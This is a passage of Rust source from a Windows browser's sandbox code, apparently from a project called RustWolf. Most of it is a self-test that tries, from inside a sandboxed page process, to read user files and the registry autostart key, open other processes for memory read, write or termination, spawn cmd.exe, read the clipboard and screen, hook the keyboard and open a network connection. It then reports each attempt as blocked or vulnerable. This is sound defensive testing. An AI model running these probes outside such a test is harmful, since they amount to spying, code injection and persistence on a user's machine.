            cwd.as_ptr(),
            &si.StartupInfo,
            &mut pi,
        );
        if have_attrs {
            DeleteProcThreadAttributeList(attrs);
        }
        if ok == 0 {
            return fail("start");
        }
        AssignProcessToJobObject(job.0, pi.hProcess);
        ResumeThread(pi.hThread);
        CloseHandle(pi.hThread);
        // Wait for the page copy, or for the browser to go away (then the job closes with this
        // launcher and takes the page copy with it).
        let browser = std::env::var("RUSTWOLF_BROWSER_PID")
            .ok()
            .and_then(|p| p.parse::<u32>().ok())
            .map(|pid| OpenProcess(PROCESS_SYNCHRONIZE, 0, pid))
            .unwrap_or(std::ptr::null_mut());
        if browser.is_null() {
            WaitForSingleObject(pi.hProcess, INFINITE);
        } else {
            let both = [pi.hProcess, browser];
            WaitForMultipleObjects(2, both.as_ptr(), 0, INFINITE);
            CloseHandle(browser);
        }
        let mut code = 1u32;
        GetExitCodeProcess(pi.hProcess, &mut code);
        CloseHandle(pi.hProcess);
        Some(code)
    }
}

/// Can this process read the user's own files? (Sandbox self-test.)
pub fn can_read_user_files() -> bool {
    std::env::var_os("USERPROFILE").is_some_and(|p| std::fs::read_dir(p).is_ok())
}

/// Sandbox self-attack (RUSTWOLF_SANDBOX_TEST=1): runs inside a sandboxed page process and tries
/// what a page that hacked the engine would try. Each line says whether the attack worked.
pub fn sandbox_attack_report() {
    use windows_sys::Win32::Foundation::{CloseHandle, HWND, LPARAM};
    use windows_sys::Win32::Graphics::Gdi::{GetDC, GetPixel, ReleaseDC, CLR_INVALID};
    use windows_sys::Win32::Storage::FileSystem::{FindClose, FindFirstFileW, FindNextFileW, WIN32_FIND_DATAW};
    use windows_sys::Win32::System::DataExchange::{CloseClipboard, OpenClipboard};
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS,
    };
    use windows_sys::Win32::System::Registry::{
        RegCloseKey, RegCreateKeyExW, RegDeleteKeyW, RegOpenKeyExW, HKEY, HKEY_CURRENT_USER, KEY_READ, KEY_WRITE, REG_OPTION_VOLATILE,
    };
    use windows_sys::Win32::System::Threading::{OpenProcess, PROCESS_DUP_HANDLE, PROCESS_TERMINATE, PROCESS_VM_READ, PROCESS_VM_WRITE};
    use windows_sys::Win32::UI::WindowsAndMessaging::{
        CallNextHookEx, EnumWindows, GetWindowThreadProcessId, PostMessageW, SetWindowsHookExW, UnhookWindowsHookEx, WH_KEYBOARD_LL, WM_NULL,
    };

    let line = |what: &str, worked: bool, expected_ok: bool| {
        let verdict = match (worked, expected_ok) {
            (false, _) => "blocked",
            (true, true) => "allowed (expected)",
            (true, false) => "WORKED  <-- VULNERABLE",
        };
        eprintln!("[attack] {what:<55} {verdict}");
    };
    let env = |k: &str| std::env::var(k).unwrap_or_default();
    let try_write = |p: &str| {
        let w = std::fs::write(p, b"x").is_ok();
        let _ = std::fs::remove_file(p);
        w
    };
    unsafe {
        // Files
        line("list your user folder", std::fs::read_dir(env("USERPROFILE")).is_ok(), false);
        line("read RustWolf settings.json", std::fs::read(format!("{}\\RustWolf\\settings.json", env("APPDATA"))).is_ok(), false);
        line("list your Desktop", std::fs::read_dir(format!("{}\\Desktop", env("USERPROFILE"))).is_ok(), false);
        line("write a file in your user folder", try_write(&format!("{}\\rustwolf-attack.txt", env("USERPROFILE"))), false);
        line("write a file in your TEMP folder", try_write(&format!("{}\\rustwolf-attack.txt", env("TEMP"))), false);
        line("write a file in C:\\Users\\Public", try_write("C:\\Users\\Public\\rustwolf-attack.txt"), false);
        line("list C:\\Windows\\System32 (system files)", std::fs::read_dir("C:\\Windows\\System32").is_ok(), true);

        // Registry
        let mut k: HKEY = std::ptr::null_mut();
        let r = RegOpenKeyExW(HKEY_CURRENT_USER, wide("Software\\Microsoft\\Windows\\CurrentVersion\\Run").as_ptr(), 0, KEY_READ, &mut k) == 0;
        if r {
            RegCloseKey(k);
        }
        line("read your registry (autostart list)", r, false);
        let mut k: HKEY = std::ptr::null_mut();
        let sub = wide("Software\\RustWolfAttackProbe");
        let w = RegCreateKeyExW(HKEY_CURRENT_USER, sub.as_ptr(), 0, std::ptr::null(), REG_OPTION_VOLATILE, KEY_WRITE, std::ptr::null(), &mut k, std::ptr::null_mut()) == 0;
        if w {
            RegCloseKey(k);
            RegDeleteKeyW(HKEY_CURRENT_USER, sub.as_ptr());
        }
        line("write your registry (e.g. add autostart malware)", w, false);

        // Other processes
        let browser: u32 = env("RUSTWOLF_BROWSER_PID").parse().unwrap_or(0);
        let me = std::process::id();
        let my_exe = std::env::current_exe().ok().and_then(|p| p.file_name().map(|n| n.to_string_lossy().to_lowercase())).unwrap_or_default();
        let (mut explorer, mut other_page) = (0u32, 0u32);
        let mut all = Vec::new();
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        let mut e: PROCESSENTRY32W = std::mem::zeroed();
        e.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
        if Process32FirstW(snap, &mut e) != 0 {
            loop {
                let n = e.szExeFile.iter().position(|&c| c == 0).unwrap_or(0);
                all.push((e.th32ProcessID, e.th32ParentProcessID, String::from_utf16_lossy(&e.szExeFile[..n]).to_lowercase()));
                if Process32NextW(snap, &mut e) == 0 {
                    break;
                }
            }
        }
        CloseHandle(snap);
        let launchers: Vec<u32> = all.iter().filter(|(_, parent, _)| *parent == browser).map(|(pid, _, _)| *pid).collect();
        for (pid, parent, name) in &all {
            if name == "explorer.exe" {
                explorer = *pid;
            }
            // another sandboxed page copy: our exe, child of a launcher, not us
            if *name == my_exe && *pid != me && launchers.contains(parent) {
                other_page = *pid;
            }
        }
        let try_open = |pid: u32, access: u32| {
            if pid == 0 {
                return false;
            }
            let h = OpenProcess(access, 0, pid);
            if h.is_null() {
                false
            } else {
                CloseHandle(h);
                true
            }
        };
        line("read the browser's memory", try_open(browser, PROCESS_VM_READ), false);
        line("take handles out of the browser", try_open(browser, PROCESS_DUP_HANDLE), false);
        line("kill the browser", try_open(browser, PROCESS_TERMINATE), false);
        line("read Windows Explorer's memory", try_open(explorer, PROCESS_VM_READ), false);
        line("inject code into Windows Explorer", try_open(explorer, PROCESS_VM_WRITE), false);
        line("kill Windows Explorer", try_open(explorer, PROCESS_TERMINATE), false);
        if other_page != 0 {
            line("read another page process's memory", try_open(other_page, PROCESS_VM_READ), false);
            line("kill another page process", try_open(other_page, PROCESS_TERMINATE), false);
            line("take handles out of another page process", try_open(other_page, PROCESS_DUP_HANDLE), true);
        } else {
            eprintln!("[attack] (no other page process running to attack)");
        }

        // Programs, clipboard, screen, keyboard, windows
        line("start a program (cmd.exe)", std::process::Command::new("cmd.exe").args(["/c", "exit"]).spawn().is_ok(), false);
        // Your clipboard always has something in it (put there by the test launcher if needed).
        let mut c = false;
        if OpenClipboard(std::ptr::null_mut()) != 0 {
            c = windows_sys::Win32::System::DataExchange::CountClipboardFormats() > 0;
            CloseClipboard();
        }
        line("see what's in your clipboard", c, false);
        let dc = GetDC(std::ptr::null_mut());
        let px = !dc.is_null() && GetPixel(dc, 10, 10) != CLR_INVALID;
        if !dc.is_null() {
            ReleaseDC(std::ptr::null_mut(), dc);
        }
        line("read the screen (screenshot)", px, false);
        unsafe extern "system" fn ll(code: i32, w: usize, l: isize) -> isize {
            CallNextHookEx(std::ptr::null_mut(), code, w, l)
        }
        // A keyboard hook only sees keys typed on the hooking thread's desktop: what matters is
        // whether this process can reach the desktop you type on.
        let hook = SetWindowsHookExW(WH_KEYBOARD_LL, Some(ll), std::ptr::null_mut(), 0);
        if !hook.is_null() {
            UnhookWindowsHookEx(hook);
        }
        let input = windows_sys::Win32::System::StationsAndDesktops::OpenInputDesktop(0, 0, 0x0001 | 0x0002 /* READOBJECTS | CREATEWINDOW */);
        if !input.is_null() {
            windows_sys::Win32::System::StationsAndDesktops::CloseDesktop(input);
        }
        line("reach the desktop you type on (keylogging)", !input.is_null(), false);
        let _ = hook;
        struct Find {
            pid: u32,
            hwnd: HWND,
        }
        unsafe extern "system" fn each(h: HWND, l: LPARAM) -> i32 {
            let f = &mut *(l as *mut Find);
            let mut pid = 0;
            GetWindowThreadProcessId(h, &mut pid);
            if pid == f.pid {
                f.hwnd = h;
                0
            } else {
                1
            }
        }
        let mut f = Find { pid: browser, hwnd: std::ptr::null_mut() };
        EnumWindows(Some(each), &mut f as *mut Find as LPARAM);
        let sent = !f.hwnd.is_null() && PostMessageW(f.hwnd, WM_NULL, 0, 0) != 0;
        line("send messages to the browser window", sent, false);

        // Engine pipes
        let mut fd: WIN32_FIND_DATAW = std::mem::zeroed();
        let h = FindFirstFileW(wide("\\\\.\\pipe\\*").as_ptr(), &mut fd);
        let mut ipc = 0;
        if h as isize != -1 {
            loop {
                let n = fd.cFileName.iter().position(|&c| c == 0).unwrap_or(0);
                if String::from_utf16_lossy(&fd.cFileName[..n]).starts_with("rust-ipc-") {
                    ipc += 1;
                }
                if FindNextFileW(h, &mut fd) == 0 {
                    break;
                }
            }
            FindClose(h);
        }
        line(&format!("list the engine's pipes ({ipc} visible)"), ipc > 0, true);

        // Network (known gap)
        let net = std::net::TcpStream::connect_timeout(&"1.1.1.1:443".parse().unwrap(), std::time::Duration::from_secs(3)).is_ok();
        line("open its own internet connection (skipping Tor)", net, false);
    }
}

/// Strict permissions on this process (browser and sandbox launchers): only you and SYSTEM may
/// open it. Windows' default also lets anything in your logon session terminate it, which a
/// sandboxed page process keeps, so a hacked page could otherwise kill the browser.
pub fn protect_own_process() {
    use windows_sys::Win32::Foundation::LocalFree;
    use windows_sys::Win32::Security::Authorization::{
        ConvertStringSecurityDescriptorToSecurityDescriptorW, SetSecurityInfo, SDDL_REVISION_1, SE_KERNEL_OBJECT,
    };
    use windows_sys::Win32::Security::{
        GetSecurityDescriptorDacl, DACL_SECURITY_INFORMATION, PROTECTED_DACL_SECURITY_INFORMATION, PSECURITY_DESCRIPTOR, TOKEN_QUERY,
    };
    use windows_sys::Win32::System::Threading::GetCurrentProcess;
    let Some((user, _)) = own_token(TOKEN_QUERY).as_ref().and_then(user_and_logon_sids) else { return };
    unsafe {
        let mut sd: PSECURITY_DESCRIPTOR = std::ptr::null_mut();
        let sddl = wide(&format!("D:P(A;;GA;;;SY)(A;;GA;;;{user})"));
        if ConvertStringSecurityDescriptorToSecurityDescriptorW(sddl.as_ptr(), SDDL_REVISION_1, &mut sd, std::ptr::null_mut()) == 0 {
            return;
        }
        let (mut present, mut defaulted, mut dacl) = (0, 0, std::ptr::null_mut());
        GetSecurityDescriptorDacl(sd, &mut present, &mut dacl, &mut defaulted);
        SetSecurityInfo(
            GetCurrentProcess(),
            SE_KERNEL_OBJECT,
            DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            dacl,
            std::ptr::null(),
        );
        LocalFree(sd as _);
    }
}
